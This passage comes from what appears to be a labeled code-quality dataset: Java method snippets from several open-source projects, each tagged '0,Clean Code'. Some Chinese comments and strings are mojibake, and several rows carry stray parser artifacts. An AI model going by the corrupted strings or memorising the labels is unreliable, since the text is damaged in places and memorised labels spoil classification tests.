          fragment.getParentActivity().getWindow().addFlags(WindowManager.LayoutParams.FLAG_SECURE);
        }
      }
    }
 else {
      if (allowScreenshots) {
        windowLayoutParams.flags&=~WindowManager.LayoutParams.FLAG_SECURE;
      }
 else {
        windowLayoutParams.flags|=WindowManager.LayoutParams.FLAG_SECURE;
      }
      try {
        windowManager.updateViewLayout(windowView,windowLayoutParams);
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
    }
  }
}
",0,Clean Code
"private void openEditingMessageInPhotoEditor(){
  if (editingMessageObject == null || !editingMessageObject.canEditMedia() || editingMessageObjectReqId != 0) {
    return;
  }
  if (!editingMessageObject.isPhoto() && !editingMessageObject.isVideo()) {
    return;
  }
  final MessageObject object=editingMessageObject;
  File file=null;
  if (!TextUtils.isEmpty(object.messageOwner.attachPath)) {
    file=new File(object.messageOwner.attachPath);
    if (!file.exists()) {
      file=null;
    }
  }
  if (file == null) {
    file=FileLoader.getInstance(currentAccount).getPathToMessage(object.messageOwner);
  }
  if (!file.exists()) {
    return;
  }
  PhotoViewer.getInstance().setParentActivity(this,themeDelegate);
  final ArrayList<Object> photos=new ArrayList<>();
  final MediaController.PhotoEntry entry=new MediaController.PhotoEntry(0,0,0,file.getAbsolutePath(),0,object.isVideo(),0,0,0);
  entry.caption=chatActivityEnterView.getFieldText();
  photos.add(entry);
  PhotoViewer.getInstance().openPhotoForSelect(photos,0,2,false,new PhotoViewer.EmptyPhotoViewerProvider(){
    @Override public PhotoViewer.PlaceProviderObject getPlaceForPhoto(    MessageObject messageObject,    TLRPC.FileLocation fileLocation,    int index,    boolean needPreview){
      return ChatActivity.this.getPlaceForPhoto(object,null,needPreview,true);
    }
    @Override public void sendButtonPressed(    int index,    VideoEditedInfo videoEditedInfo,    boolean notify,    int scheduleDate,    boolean forceDocument){
      if (editingMessageObject != object) {
        return;
      }
      if (entry.isCropped || entry.isPainted || entry.isFiltered|| videoEditedInfo != null) {
        sendMedia(entry,videoEditedInfo,notify,scheduleDate,forceDocument);
      }
 else {
        chatActivityEnterView.doneEditingMessage();
      }
    }
    @Override public boolean canCaptureMorePhotos(){
      return false;
    }
    @Override public boolean allowSendingSubmenu(){
      return false;
    }
    @Override public MessageObject getEditingMessageObject(){
      return editingMessageObject == object ? object : null;
    }
    @Override public void onCaptionChanged(    CharSequence caption){
      if (editingMessageObject == object) {
        chatActivityEnterView.setFieldText(caption,true);
      }
    }
    @Override public boolean closeKeyboard(){
      if (chatActivityEnterView != null && isKeyboardVisible()) {
        chatActivityEnterView.closeKeyboard();
        return true;
      }
      return false;
    }
  }
,this);
}",0,Clean Code
"@Override public ServletInputStream getInputStream() throws IOException {
  final ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(body);
  return new ServletInputStream(){
    @Override public int read(){
      return byteArrayInputStream.read();
    }
    @Override public boolean isFinished(){
      return byteArrayInputStream.available() == 0;
    }
    @Override public boolean isReady(){
      return true;
    }
    @Override public void setReadListener(    ReadListener readListener){
    }
  }
;
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)50);
    output.writeMessageNoTag(buffInfo);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)82);
    output.writeMessageNoTag(miracleInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)90);
    output.writeMessageNoTag(itemInfo);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeMessage(FieldNames.buffInfo,buffInfo);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeMessage(FieldNames.miracleInfo,miracleInfo);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeMessage(FieldNames.itemInfo,itemInfo);
  }
  output.endObject();
}",0,Clean Code
"@ApiOperation(""淇敼鏂囦欢鍚嶇О"") @PostMapping(""/renameFile"") public Result renameFile(@RequestBody RenameFileBO requestBO){
  adminFileService.renameFile(requestBO);
  return Result.ok();
}
",0,Clean Code
"public int getGroupTypeFlag(){
  return this.groupTypeFlag;
}
",0,Clean Code
"@Override public SceneEntityRefreshInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  addEntity.clearQuick();
  return this;
}",0,Clean Code
"@Test @Order(2) void executeWriteShouldExecuteQuery(){
  String query=""CREATE (n:Person {name: 'John'})"";
  ResultSummary resultSummary=neo4jGraph.executeWrite(query);
  assertEquals(1,resultSummary.counters().nodesCreated());
}",0,Clean Code
"public void cleanResources(boolean recycle){
  if (reusableFramebuffer != 0) {
    buffers[0]=reusableFramebuffer;
    GLES20.glDeleteFramebuffers(1,buffers,0);
    reusableFramebuffer=0;
  }
  if (bitmapTexture != null) {
    bitmapTexture.cleanResources(recycle);
  }
  if (bitmapBlurTexture != null) {
    bitmapBlurTexture.cleanResources(recycle);
  }
  if (paintTexture != 0) {
    buffers[0]=paintTexture;
    GLES20.glDeleteTextures(1,buffers,0);
    paintTexture=0;
  }
  for (  Texture texture : brushTextures.values()) {
    if (texture != null) {
      texture.cleanResources(true);
    }
  }
  brushTextures.clear();
  if (helperTexture != 0) {
    buffers[0]=helperTexture;
    GLES20.glDeleteTextures(1,buffers,0);
    helperTexture=0;
  }
  if (bluredTexture != null) {
    bluredTexture.cleanResources(true);
  }
  if (originalBitmapTexture != null) {
    originalBitmapTexture.cleanResources(true);
  }
  if (shaders != null) {
    for (    Shader shader : shaders.values()) {
      shader.cleanResources();
    }
    shaders=null;
  }
}",0,Clean Code
"protected BedrockUsage(AmazonBedrockInvocationMetrics usage){
  Assert.notNull(usage,""OpenAI Usage must not be null"");
  this.usage=usage;
}
",0,Clean Code
"public Builder(AMQPEventQueueProperties properties){
  this.properties=properties;
  this.addresses=buildAddressesFromHosts();
  this.factory=buildConnectionFactory();
  this.batchSize=properties.getBatchSize();
  this.pollTimeInMS=(int)properties.getPollTimeDuration().toMillis();
}
",0,Clean Code
"/** 
 * Creates a new instance of  {@link SegmentBuilder}.
 * @param maxSegmentSize The maximum size of a segment.
 * @param sizeFunction The function to use to estimate the size of a text.
 * @param joinSeparator The separator to use when joining multiple texts into a single segment.
 */
public SegmentBuilder(int maxSegmentSize,Function<String,Integer> sizeFunction,String joinSeparator){
  this.maxSegmentSize=ensureGreaterThanZero(maxSegmentSize,""maxSegmentSize"");
  this.sizeFunction=ensureNotNull(sizeFunction,""sizeFunction"");
  this.joinSeparator=ensureNotNull(joinSeparator,""joinSeparator"");
  joinSeparatorSize=sizeOf(joinSeparator);
}
",0,Clean Code
"/** 
 * Attempts to load from a local file using the relative ""filePrefix"", ie starting at the current directory. For example
 * @param filePrefix could be ""webSiteClasses\\site1\\"".
 */
public FileClassLoader(final String filePrefix){
  this.filePrefix=filePrefix;
}",0,Clean Code
"@Override public void checkReadResource(URI uri) throws SecurityManagerException {
  checkRead(uri,allowedResources,""resourceNotInAllowList"");
}
",0,Clean Code
"@Override public void onScrollStateChanged(RecyclerView recyclerView,int newState){
  if (newState == RecyclerView.SCROLL_STATE_DRAGGING) {
    wasManualScroll=true;
    scrollingManually=true;
  }
 else {
    scrollingManually=false;
  }
  if (newState == RecyclerView.SCROLL_STATE_IDLE) {
    wasManualScroll=false;
    disableActionBarScrolling=false;
    if (waitingForScrollFinished) {
      waitingForScrollFinished=false;
      if (updatePullAfterScroll) {
        viewPage.listView.updatePullState();
        updatePullAfterScroll=false;
      }
      viewPage.dialogsAdapter.notifyDataSetChanged();
    }
    if (filterTabsView != null && filterTabsView.getVisibility() == View.VISIBLE && viewPages[0].listView == recyclerView) {
      int scrollY=(int)-actionBar.getTranslationY();
      int actionBarHeight=ActionBar.getCurrentActionBarHeight();
      if (scrollY != 0 && scrollY != actionBarHeight) {
        if (scrollY < actionBarHeight / 2) {
          if (viewPages[0].listView.canScrollVertically(-1)) {
            recyclerView.smoothScrollBy(0,-scrollY);
          }
        }
 else         if (viewPages[0].listView.canScrollVertically(1)) {
          recyclerView.smoothScrollBy(0,actionBarHeight - scrollY);
        }
      }
    }
  }
}",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof RegionEntry)) {
    return false;
  }
  RegionEntry other=(RegionEntry)o;
  return bitField0_ == other.bitField0_ && (!hasName() || name.equals(other.name)) && (!hasTitle() || title.equals(other.title)) && (!hasDispatchUrl() || dispatchUrl.equals(other.dispatchUrl)) && (!hasEnvType() || envType.equals(other.envType)) && (!hasDisplayName() || displayName.equals(other.displayName)) && (!hasMsg() || msg.equals(other.msg));
}",0,Clean Code
"public static DispatchRegionData parseFrom(final byte[] data) throws InvalidProtocolBufferException {
  return ProtoMessage.mergeFrom(new DispatchRegionData(),data).checkInitialized();
}
public static DispatchRegionData parseFrom(final ProtoSource input) throws IOException {
  return ProtoMessage.mergeFrom(new DispatchRegionData(),input).checkInitialized();
}
public static DispatchRegionData parseFrom(final JsonSource input) throws IOException {
  return ProtoMessage.mergeFrom(new DispatchRegionData(),input).checkInitialized();
}
",0,Clean Code
"@Override public boolean matches(final ZyGraphNode<? extends CViewNode<?>> node){
  if (panel.getRecursionState() == RecursionState.IS_RECURSION) {
    return node.getChildren().contains(node);
  }
 else {
    return node.getChildren().contains(node);
  }
}
",0,Clean Code
"@Override public RogueMiracle mergeFrom(final RogueMiracle other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasNKBEHFHLPEF()) {
    setNKBEHFHLPEF(other.nKBEHFHLPEF);
  }
  if (other.hasMMFONFFPNJM()) {
    setMMFONFFPNJM(other.mMFONFFPNJM);
  }
  if (other.hasMiracleId()) {
    setMiracleId(other.miracleId);
  }
  if (other.hasKONAGCDHKKH()) {
    getMutableKONAGCDHKKH().addAll(other.kONAGCDHKKH);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1fa4cf8a!org.eclipse.jdt.core.dom.MethodDeclaration@4f8c3319@Override public KONAGCDHKKHEntry mergeFrom(final KONAGCDHKKHEntry other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasKey()) {
    setKey(other.key);
  }
  if (other.hasValue()) {
    setValue(other.value_);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@82cacb2!org.eclipse.jdt.core.dom.MethodDeclaration@648859f3",0,Clean Code
"@Override public void draw(Canvas canvas,CharSequence text,int start,int end,float x,int top,int y,int bottom,Paint paint){
  TextPaint textPaint=(TextPaint)paint;
  float characterWidth=paint.measureText(this.text) / 3;
  float baseline=fixTop ? -textPaint.getFontMetrics().ascent : -textPaint.getFontMetrics().top;
  float textThickness=(float)((textPaint.getFontMetrics().bottom - textPaint.getFontMetrics().top) * (isMediumTypeface ? 0.05f : 0.0365f));
  baseline-=textThickness;
  if (waitForNextAnimation) {
    if (System.currentTimeMillis() - lastTime > 1000) {
      waitForNextAnimation=false;
    }
  }
 else {
    swapProgress+=16 / 300f;
    if (swapProgress > 1) {
      swapProgress=0;
      swapPosition1--;
      swapPosition2--;
      if (swapPosition1 < 0) {
        swapPosition1=1;
        swapPosition2=2;
        waitForNextAnimation=true;
        lastTime=System.currentTimeMillis();
      }
    }
  }
  for (int i=0; i < 3; i++) {
    float cx=characterWidth * i + x + characterWidth / 2f;
    float cy=baseline;
    if (i == swapPosition1) {
      float fromX=cx;
      float toX=characterWidth * (i + 1) + x + characterWidth / 2f;
      cx=AndroidUtilities.lerp(fromX,toX,swapProgress);
      float swapProgressHalf=swapProgress < 0.5f ? swapProgress / 0.5f : 1f - (swapProgress - 0.5f) / 0.5f;
      cy=AndroidUtilities.lerp(cy,cy - characterWidth / 2f,circle.getInterpolation(swapProgressHalf));
    }
 else     if (i == swapPosition2) {
      float fromX=cx;
      float toX=characterWidth * (i - 1) + x + characterWidth / 2f;
      cx=AndroidUtilities.lerp(fromX,toX,swapProgress);
    }
    canvas.drawCircle(cx,cy,textThickness,paint);
  }
  if (parent != null) {
    parent.invalidate();
  }
}",0,Clean Code
"@Override public Long exportChangeSalaryRecord(MultipartFile multipartFile){
  UploadExcelBO uploadExcelBO=new UploadExcelBO();
  AdminMessage adminMessage=new AdminMessage();
  adminMessage.setCreateUser(UserUtil.getUserId());
  adminMessage.setCreateTime(LocalDateTime.now());
  adminMessage.setRecipientUser(UserUtil.getUserId());
  adminMessage.setLabel(8);
  adminMessage.setType(AdminMessageEnum.HRM_CHANGE_SALARY_IMPORT.getType());
  Long messageId=adminMessageService.saveOrUpdateMessage(adminMessage);
  uploadExcelBO.setMessageId(messageId);
  uploadExcelBO.setUserInfo(UserUtil.getUser());
  redis.setex(AdminCacheKey.UPLOAD_EXCEL_MESSAGE_PREFIX + messageId.toString(),UPLOAD_EXCEL_EXIST_TIME,0);
  ExcelImport uploadService=new ChangeSalaryExport(uploadExcelBO,multipartFile);
  hrmThreadPoolExecutor.execute(uploadService);
  return messageId;
}",0,Clean Code
"IModuleConfiguration getConfiguration();
",0,Clean Code
"@Override public GetFarmStageGachaInfoScRsp clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  retcode=0;
  farmStageGachaInfoList.clear();
  return this;
}",0,Clean Code
"public String getSimilarity(){
  return similarity;
}
",0,Clean Code
"public static ToolChoice from(String functionName){
  return new ToolChoice(functionName);
}
",0,Clean Code
void setY2(double y2);,0,Clean Code
"@Override public int insertDictData(SysDictDataEntity dictData){
  int row=dictDataMapper.insert(dictData);
  if (row > 0) {
    List<SysDictDataEntity> dictDatas=dictDataMapper.selectDictDataByType(dictData.getDictType());
    DictUtils.setDictCache(dictData.getDictType(),dictDatas);
  }
  return row;
}",0,Clean Code
"/** 
 * @return factory for creating GachaCeilingAvatar messages
 */
public static MessageFactory<GachaCeilingAvatar> getFactory(){
  return GachaCeilingAvatarFactory.INSTANCE;
}
",0,Clean Code
"@Override public void flush(String queueName){
  DynoQueue queue=queues.get(queueName);
  if (queue != null) {
    queue.clear();
  }
}
",0,Clean Code
"public String toString(){
  return ""GProRecommendV2Color{uint32R="" + this.uint32R + "",uint32G=""+ this.uint32G+ "",uint32B=""+ this.uint32B+ "",}"";
}",0,Clean Code
"/** 
 * Sets up the hoodie key options (e.g. record key and partition key) from the table definition.
 */
private static void setupHoodieKeyOptions(Configuration conf,CatalogTable table){
  List<String> pkColumns=table.getSchema().getPrimaryKey().map(UniqueConstraint::getColumns).orElse(Collections.emptyList());
  if (pkColumns.size() > 0) {
    String recordKey=String.join("","",pkColumns);
    conf.setString(FlinkOptions.RECORD_KEY_FIELD,recordKey);
  }
  List<String> partitionKeys=table.getPartitionKeys();
  if (partitionKeys.size() > 0) {
    conf.setString(FlinkOptions.PARTITION_PATH_FIELD,String.join("","",partitionKeys));
  }
  if (conf.getString(FlinkOptions.INDEX_TYPE).equals(HoodieIndex.IndexType.BUCKET.name())) {
    if (conf.getString(FlinkOptions.INDEX_KEY_FIELD).isEmpty()) {
      conf.setString(FlinkOptions.INDEX_KEY_FIELD,conf.getString(FlinkOptions.RECORD_KEY_FIELD));
    }
 else {
      Set<String> recordKeySet=Arrays.stream(conf.getString(FlinkOptions.RECORD_KEY_FIELD).split("","")).collect(Collectors.toSet());
      Set<String> indexKeySet=Arrays.stream(conf.getString(FlinkOptions.INDEX_KEY_FIELD).split("","")).collect(Collectors.toSet());
      if (!recordKeySet.containsAll(indexKeySet)) {
        throw new HoodieValidationException(FlinkOptions.INDEX_KEY_FIELD + "" should be a subset of or equal to the recordKey fields"");
      }
    }
  }
  final String[] partitions=conf.getString(FlinkOptions.PARTITION_PATH_FIELD).split("","");
  final String[] pks=conf.getString(FlinkOptions.RECORD_KEY_FIELD).split("","");
  if (partitions.length == 1) {
    final String partitionField=partitions[0];
    if (partitionField.isEmpty()) {
      conf.setString(FlinkOptions.KEYGEN_CLASS_NAME,NonpartitionedAvroKeyGenerator.class.getName());
      LOG.info(""Table option [{}] is reset to {} because this is a non-partitioned table"",FlinkOptions.KEYGEN_CLASS_NAME.key(),NonpartitionedAvroKeyGenerator.class.getName());
      return;
    }
    DataType partitionFieldType=table.getSchema().getFieldDataType(partitionField).orElseThrow(() -> new HoodieValidationException(""Field "" + partitionField + "" does not exist""));
    if (pks.length <= 1 && DataTypeUtils.isDatetimeType(partitionFieldType)) {
      setupTimestampKeygenOptions(conf,partitionFieldType);
      return;
    }
  }
  boolean complexHoodieKey=pks.length > 1 || partitions.length > 1;
  if (complexHoodieKey && FlinkOptions.isDefaultValueDefined(conf,FlinkOptions.KEYGEN_CLASS_NAME)) {
    conf.setString(FlinkOptions.KEYGEN_CLASS_NAME,ComplexAvroKeyGenerator.class.getName());
    LOG.info(""Table option [{}] is reset to {} because record key or partition path has two or more fields"",FlinkOptions.KEYGEN_CLASS_NAME.key(),ComplexAvroKeyGenerator.class.getName());
  }
}",0,Clean Code
"/** 
 * @return the backoff rate of this task definition
 */
public Integer getBackoffScaleFactor(){
  return backoffScaleFactor;
}
",0,Clean Code
"/** 
 * <code>optional uint32 AFMPDBBHCHM = 2;</code>
 * @return this
 */
public DoGachaInRollShopScRsp clearAFMPDBBHCHM(){
  bitField0_&=~0x00000001;
  aFMPDBBHCHM=0;
  return this;
}",0,Clean Code
"public static int serverStringToFeatureType(String s){
switch (s) {
case ""double_limits"":
    return PREMIUM_FEATURE_LIMITS;
case ""more_upload"":
  return PREMIUM_FEATURE_UPLOAD_LIMIT;
case ""faster_download"":
return PREMIUM_FEATURE_DOWNLOAD_SPEED;
case ""voice_to_text"":
return PREMIUM_FEATURE_VOICE_TO_TEXT;
case ""no_ads"":
return PREMIUM_FEATURE_ADS;
case ""infinite_reactions"":
return PREMIUM_FEATURE_REACTIONS;
case ""premium_stickers"":
return PREMIUM_FEATURE_STICKERS;
case ""advanced_chat_management"":
return PREMIUM_FEATURE_ADVANCED_CHAT_MANAGEMENT;
case ""profile_badge"":
return PREMIUM_FEATURE_PROFILE_BADGE;
case ""animated_userpics"":
return PREMIUM_FEATURE_ANIMATED_AVATARS;
case ""app_icons"":
return PREMIUM_FEATURE_APPLICATION_ICONS;
case ""animated_emoji"":
return PREMIUM_FEATURE_ANIMATED_EMOJI;
case ""emoji_status"":
return PREMIUM_FEATURE_EMOJI_STATUS;
case ""translations"":
return PREMIUM_FEATURE_TRANSLATIONS;
}
return -1;
}",0,Clean Code
"public static Drawable getOrCreate(Drawable backgroundDrawable,TLRPC.WallPaper wallpaper,boolean themeIsDark){
  if (backgroundDrawable instanceof ChatBackgroundDrawable) {
    ChatBackgroundDrawable chatBackgroundDrawable=(ChatBackgroundDrawable)backgroundDrawable;
    if (wallpaper.uploadingImage != null) {
      if (wallpaper.uploadingImage.equals(chatBackgroundDrawable.wallpaper.uploadingImage)) {
        if (wallpaper.settings != null && chatBackgroundDrawable.wallpaper.settings != null && wallpaper.settings.intensity > 0) {
          if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
            return chatBackgroundDrawable;
          }
        }
 else {
          return chatBackgroundDrawable;
        }
      }
    }
 else     if (wallpaper.id == chatBackgroundDrawable.wallpaper.id && TextUtils.equals(hash(wallpaper.settings),hash(chatBackgroundDrawable.wallpaper.settings))) {
      if (wallpaper.document != null && !wallpaper.pattern && wallpaper.settings != null && wallpaper.settings.intensity > 0) {
        if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
          return chatBackgroundDrawable;
        }
      }
 else {
        return chatBackgroundDrawable;
      }
    }
  }
  return new ChatBackgroundDrawable(wallpaper,themeIsDark,false);
}",0,Clean Code
"@Override public void mouseClicked(final MouseEvent event){
  if (event.getButton() == MouseEvent.BUTTON1 && event.getClickCount() == 2) {
    handleDoubleClick(getSelectionIndex(event));
  }
}",0,Clean Code
"private int hashCodeForArray(Object array){
  if (array instanceof boolean[]) {
    return Arrays.hashCode((boolean[])array);
  }
  if (array instanceof byte[]) {
    return Arrays.hashCode((byte[])array);
  }
  if (array instanceof char[]) {
    return Arrays.hashCode((char[])array);
  }
  if (array instanceof double[]) {
    return Arrays.hashCode((double[])array);
  }
  if (array instanceof float[]) {
    return Arrays.hashCode((float[])array);
  }
  if (array instanceof int[]) {
    return Arrays.hashCode((int[])array);
  }
  if (array instanceof long[]) {
    return Arrays.hashCode((long[])array);
  }
  if (array instanceof short[]) {
    return Arrays.hashCode((short[])array);
  }
  return Arrays.hashCode((Object[])array);
}
",0,Clean Code
"@Override public boolean equals(Object o){
  if (o == this) {
    return true;
  }
  if (!(o instanceof GetChallengeScRsp)) {
    return false;
  }
  GetChallengeScRsp other=(GetChallengeScRsp)o;
  return bitField0_ == other.bitField0_ && (!hasRetcode() || retcode == other.retcode) && (!hasChallengeRewardList() || challengeRewardList.equals(other.challengeRewardList)) && (!hasChallengeList() || challengeList.equals(other.challengeList));
}",0,Clean Code
"/** 
 * 妫�鏌ヤ慨鏀规槸鍚︽湁鏁�
 * @param folder 鏂囦欢澶�
 */
private void updateParamValid(FolderEntity folder){
  XzException404.throwBy(folder.getId() == null,""ID涓嶅緱涓虹┖"");
  XzException400.throwBy(folder.getId().equals(folder.getPid()),""涓婄骇鏂囦欢澶逛笉鑳芥槸鑷繁"");
}",0,Clean Code
"private RogueSeasonInfo(){
}
",0,Clean Code
"/** 
 * 鑾峰彇涓嬩釜瀹℃牳璁板綍
 * @param record
 * @return
 */
FlowDataDealRecord getNext(FlowDataDealRecord record);
",0,Clean Code
"protected void beforeShow(){
  preShow=true;
  dismissAnimFlag=false;
  setOwnActivity(getTopActivity());
  if (getOwnActivity() == null) {
    init(null);
    if (getOwnActivity() == null) {
      error(""DialogX 鏈垵濮嬪寲(E5)銆俓n璇锋鏌ユ槸鍚﹀湪鍚姩瀵硅瘽妗嗗墠杩涜鍒濆鍖栨搷浣滐紝浣跨敤浠ヤ笅浠ｇ爜杩涜鍒濆鍖栵細\nDialogX.init(context);\n\n鍙﹀寤鸿鎮ㄥ墠寰鏌ョ湅 DialogX 鐨勬枃妗ｈ繘琛屼娇鐢細https://github.com/kongzue/DialogX"");
      return;
    }
  }
  if (style.styleVer != DialogXStyle.styleVer) {
    error(""DialogX 鎵寮曠敤鐨 Style 涓嶇鍚堝綋鍓嶉傜敤鐗堟湰锛"" + DialogXStyle.styleVer + "" 寮曞叆鐨 Style(""+ style.getClass().getSimpleName()+ "") 鐗堟湰""+ style.styleVer);
  }
  if (dialogImplMode != DialogX.IMPL_MODE.VIEW && getOwnActivity() instanceof LifecycleOwner) {
    Lifecycle lifecycle=((LifecycleOwner)getOwnActivity()).getLifecycle();
    lifecycle.addObserver(new LifecycleEventObserver(){
      @Override public void onStateChanged(      @NonNull LifecycleOwner source,      @NonNull Lifecycle.Event event){
        if (event == Lifecycle.Event.ON_DESTROY) {
          recycleDialog(getOwnActivity());
        }
      }
    }
);
  }
  if (!(this instanceof NoTouchInterface)) {
    View view=getOwnActivity().getCurrentFocus();
    if (view != null) {
      InputMethodManager imm=(InputMethodManager)getOwnActivity().getSystemService(Context.INPUT_METHOD_SERVICE);
      imm.hideSoftInputFromWindow(view.getWindowToken(),InputMethodManager.HIDE_NOT_ALWAYS);
    }
  }
}",0,Clean Code
"@Override public String signature(@Nullable Object type){
  if (type == null || type instanceof JavaType.Unknown) {
    return ""{undefined}"";
  }
  if (type instanceof JavaType.Class) {
    return classSignature(type);
  }
 else   if (type instanceof JavaType.Array) {
    return arraySignature(type);
  }
 else   if (type instanceof JavaType.Parameterized) {
    return parameterizedSignature(type);
  }
 else   if (type instanceof JavaType.GenericTypeVariable) {
    return genericSignature(type);
  }
 else   if (type instanceof JavaType.Primitive) {
    return primitiveSignature(type);
  }
 else   if (type instanceof JavaType.Method) {
    return methodSignature((JavaType.Method)type);
  }
 else   if (type instanceof JavaType.Variable) {
    return variableSignature((JavaType.Variable)type);
  }
 else   if (type instanceof JavaType.Intersection) {
    return intersectionSignature(type);
  }
  throw new UnsupportedOperationException(""Unexpected type "" + type.getClass().getName());
}
",0,Clean Code
"public boolean isModuleClass(){
  return className.equals(MODULE_CLASS_NAME);
}
",0,Clean Code
"@Override public int hashCode(){
  int result=genericDeclaration != null ? genericDeclaration.hashCode() : 0;
  result=31 * result + (name != null ? name.hashCode() : 0);
  result=31 * result + Arrays.hashCode(upperBounds);
  return result;
}",0,Clean Code
"@Override public SyncChessRogueNousValueScNotify clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  value_.clear();
  return this;
}",0,Clean Code
"private void updateMediaCount(){
  int id=sharedMediaLayout.getClosestTab();
  int[] mediaCount=sharedMediaPreloader.getLastMediaCount();
  if (id < 0 || mediaCount[id] < 0) {
    return;
  }
  if (id == 0) {
    if (sharedMediaLayout.getPhotosVideosTypeFilter() == SharedMediaLayout.FILTER_PHOTOS_ONLY) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Photos"",mediaCount[MediaDataController.MEDIA_PHOTOS_ONLY]));
    }
 else     if (sharedMediaLayout.getPhotosVideosTypeFilter() == SharedMediaLayout.FILTER_VIDEOS_ONLY) {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Videos"",mediaCount[MediaDataController.MEDIA_VIDEOS_ONLY]));
    }
 else {
      mediaCounterTextView.setText(LocaleController.formatPluralString(""Media"",mediaCount[MediaDataController.MEDIA_PHOTOVIDEO]));
    }
  }
 else   if (id == 1) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Files"",mediaCount[MediaDataController.MEDIA_FILE]));
  }
 else   if (id == 2) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Voice"",mediaCount[MediaDataController.MEDIA_AUDIO]));
  }
 else   if (id == 3) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""Links"",mediaCount[MediaDataController.MEDIA_URL]));
  }
 else   if (id == 4) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""MusicFiles"",mediaCount[MediaDataController.MEDIA_MUSIC]));
  }
 else   if (id == 5) {
    mediaCounterTextView.setText(LocaleController.formatPluralString(""GIFs"",mediaCount[MediaDataController.MEDIA_GIF]));
  }
}",0,Clean Code
"@Override public void writeTo(final ProtoSink output) throws IOException {
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeRawByte((byte)16);
    output.writeUInt32NoTag(uniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeRawByte((byte)24);
    output.writeUInt32NoTag(mainAffixId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeRawByte((byte)32);
    output.writeUInt32NoTag(promotion);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    output.writeRawByte((byte)48);
    output.writeUInt32NoTag(itemId);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    output.writeRawByte((byte)56);
    output.writeUInt32NoTag(rank);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    output.writeRawByte((byte)80);
    output.writeUInt32NoTag(level);
  }
  if ((bitField0_ & 0x00000040) != 0) {
    output.writeRawByte((byte)96);
    output.writeUInt32NoTag(num);
  }
}
@Override public void writeTo(final JsonSink output) throws IOException {
  output.beginObject();
  if ((bitField0_ & 0x00000001) != 0) {
    output.writeUInt32(FieldNames.uniqueId,uniqueId);
  }
  if ((bitField0_ & 0x00000002) != 0) {
    output.writeUInt32(FieldNames.mainAffixId,mainAffixId);
  }
  if ((bitField0_ & 0x00000004) != 0) {
    output.writeUInt32(FieldNames.promotion,promotion);
  }
  if ((bitField0_ & 0x00000008) != 0) {
    output.writeUInt32(FieldNames.itemId,itemId);
  }
  if ((bitField0_ & 0x00000010) != 0) {
    output.writeUInt32(FieldNames.rank,rank);
  }
  if ((bitField0_ & 0x00000020) != 0) {
    output.writeUInt32(FieldNames.level,level);
  }
  if ((bitField0_ & 0x00000040) != 0) {
    output.writeUInt32(FieldNames.num,num);
  }
  output.endObject();
}",0,Clean Code
"private void writeLine(final List<TextPosition> textPositionList){
  if (textPositionList.size() > 0) {
    TextLine textLine=this.addNewLine();
    boolean firstCharacterOfLineFound=false;
    for (    TextPosition textPosition : textPositionList) {
      CharacterFactory characterFactory=new CharacterFactory(firstCharacterOfLineFound);
      Character character=characterFactory.createCharacterFromTextPosition(textPosition,this.getPreviousTextPosition());
      textLine.writeCharacterAtIndex(character);
      this.setPreviousTextPosition(textPosition);
      firstCharacterOfLineFound=true;
    }
  }
 else {
    this.addNewLine();
  }
}",0,Clean Code
"/** 
 * <code>optional .NpcRogueInfo rogue_info = 6;</code>
 * @return this
 */
public NpcExtraInfo clearRogueInfo(){
  bitField0_&=~0x00000001;
  rogueInfo.clear();
  return this;
}",0,Clean Code
"/** 
 * Get the promptTokens property: The number of tokens in the provided prompts for the completions request.
 * @return the promptTokens value.
 */
public int getPromptTokens(){
  return this.promptTokens;
}
",0,Clean Code
"@Specialization protected VmList eval(VmList self){
  return self.reverse();
}
@Specialization protected VmList eval(VmSet self){
  return self.reverse();
}
@TruffleBoundary @Specialization protected String eval(String self){
  return new StringBuilder(self).reverse().toString();
}
",0,Clean Code
"public Builder responseFormat(String responseFormat){
  this.responseFormat=responseFormat;
  return this;
}
",0,Clean Code
"ConfigEvaluatorImpl(Evaluator evaluator,ValueMapper mapper){
  this.evaluator=evaluator;
  this.mapper=mapper;
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.protos.core.SequenceModelProto)) {
    return super.equals(obj);
  }
  org.tribuo.protos.core.SequenceModelProto other=(org.tribuo.protos.core.SequenceModelProto)obj;
  if (getVersion() != other.getVersion())   return false;
  if (!getClassName().equals(other.getClassName()))   return false;
  if (hasSerializedData() != other.hasSerializedData())   return false;
  if (hasSerializedData()) {
